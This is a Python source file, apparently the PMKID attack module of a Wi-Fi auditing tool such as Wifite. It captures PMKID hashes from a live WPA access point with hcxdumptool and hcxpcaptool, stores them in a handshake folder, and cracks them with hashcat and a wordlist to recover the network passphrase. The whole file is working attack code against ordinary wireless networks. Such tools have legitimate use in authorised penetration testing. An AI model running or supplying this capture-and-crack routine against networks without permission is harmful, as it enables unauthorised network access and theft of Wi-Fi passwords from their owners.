#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..util.color import Color
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import re


class AttackPMKID(Attack):

    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.success = False
        self.pcapng_file = Configuration.temp('pmkid.pcapng')


    def get_existing_pmkid_file(self, bssid):
        '''
        Load PMKID Hash from a previously-captured hash in ./hs/
        Returns:
            The hashcat hash (hash*bssid*station*essid) if found.
            None if not found.
        '''
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        bssid = bssid.lower().replace(':', '')

        file_re = re.compile('.*pmkid_.*\.16800')
        for filename in os.listdir(Configuration.wpa_handshake_dir):
            pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if not os.path.isfile(pmkid_filename):
                continue
            if not re.match(file_re, pmkid_filename):
                continue

            with open(pmkid_filename, 'r') as pmkid_handle:
                pmkid_hash = pmkid_handle.read().strip()
                if pmkid_hash.count('*') < 3:
                    continue
                existing_bssid = pmkid_hash.split('*')[1].lower().replace(':', '')
                if existing_bssid == bssid:
                    return pmkid_filename
        return None


    def run(self):
        '''
        Performs PMKID attack, if possible.
            1) Captures PMKID hash (or re-uses existing hash if found).
            2) Cracks the hash.

        Returns:
            True if handshake is captured. False otherwise.
        '''
        from ..util.process import Process
        # Check that we have all hashcat programs
        dependencies = [
            Hashcat.dependency_name,
            HcxDumpTool.dependency_name,
            HcxPcapTool.dependency_name
        ]
        missing_deps = [dep for dep in dependencies if not Process.exists(dep)]
        if len(missing_deps) > 0:
            Color.pl('{!} Skipping PMKID attack, missing required tools: {O}%s{W}' % ', '.join(missing_deps))
            return False

        pmkid_file = None

        if Configuration.ignore_old_handshakes == False:
            # Load exisitng PMKID hash from filesystem
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                        'Loaded {C}existing{W} PMKID hash: {C}%s{W}\n' % pmkid_file)

        if pmkid_file is None:
            # Capture hash from live target.
            pmkid_file = self.capture_pmkid()

        if pmkid_file is None:
            return False  # No hash found.

        # Crack it.
        try:
            self.success = self.crack_pmkid_file(pmkid_file)
        except KeyboardInterrupt:
            Color.pl('\n{!} {R}Failed to crack PMKID: {O}Cracking interrupted by user{W}')
            self.success = False
            return False

        return True  # Even if we don't crack it, capturing a PMKID is 'successful'


    def capture_pmkid(self):
        '''
        Runs hashcat's hcxpcaptool to extract PMKID hash from the .pcapng file.
        Returns:
            The PMKID hash (str) if found, otherwise None.
        '''
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        # Start hcxdumptool
        t = Thread(target=self.dumptool_thread)
        t.start()

        # Repeatedly run pcaptool & check output for hash for self.target.essid
        pmkid_hash = None
        pcaptool = HcxPcapTool(self.target)
        while self.timer.remaining() > 0:
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                break  # Got PMKID

            Color.pattack('PMKID', self.target, 'CAPTURE',
                    'Waiting for PMKID ({C}%s{W})' % str(self.timer))
            time.sleep(1)

        self.keep_capturing = False

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE',
                    '{R}Failed{O} to capture PMKID\n')
            Color.pl('')
            return None  # No hash found.

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured PMKID{W}')
        pmkid_file = self.save_pmkid(pmkid_hash)
        return pmkid_file


    def crack_pmkid_file(self, pmkid_file):
        '''
        Runs hashcat containing PMKID hash (*.16800).
        If cracked, saves results in self.crack_result
        Returns:
            True if cracked, False otherwise.
        '''

        # Check that wordlist exists before cracking.
        if Configuration.wordlist is None:
            Color.pl('\n{!} {O}Not cracking PMKID ' +
                    'because there is no {R}wordlist{O} (re-run with {C}--dict{O})')

            # TODO: Uncomment once --crack is updated to support recracking PMKIDs.
            #Color.pl('{!} {O}Run Wifite with the {R}--crack{O} and {R}--dict{O} options to try again.')

            key = None
        else:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACK', 'Cracking PMKID using {C}%s{W} ...\n' % Configuration.wordlist)
            key = Hashcat.crack_pmkid(pmkid_file)

        if key is None:
            # Failed to crack.
            if Configuration.wordlist is not None:
                Color.clear_entire_line()
                Color.pattack('PMKID', self.target, '{R}CRACK',
                        '{R}Failed {O}Passphrase not found in dictionary.\n')
            return False
        else:
            # Successfully cracked.
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACKED', '{C}Key: {G}%s{W}' % key)
            self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                    pmkid_file, key)
            Color.pl('\n')
            self.crack_result.dump()
            return True


    def dumptool_thread(self):
        '''Runs hashcat's hcxdumptool until it dies or `keep_capturing == False`'''
        dumptool = HcxDumpTool(self.target, self.pcapng_file)

        # Let the dump tool run until we have the hash.
        while self.keep_capturing and dumptool.poll() is None:
            time.sleep(0.5)

        dumptool.interrupt()


    def save_pmkid(self, pmkid_hash):
        '''Saves a copy of the pmkid (handshake) to hs/ directory.'''
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid)
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        pmkid_file = 'pmkid_%s_%s_%s.16800' % (essid_safe, bssid_safe, date)
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, pmkid_file)

        Color.p('\n{+} Saving copy of {C}PMKID Hash{W} to {C}%s{W} ' % pmkid_file)
        with open(pmkid_file, 'w') as pmkid_handle:
            pmkid_handle.write(pmkid_hash)
            pmkid_handle.write('\n')

        return pmkid_file

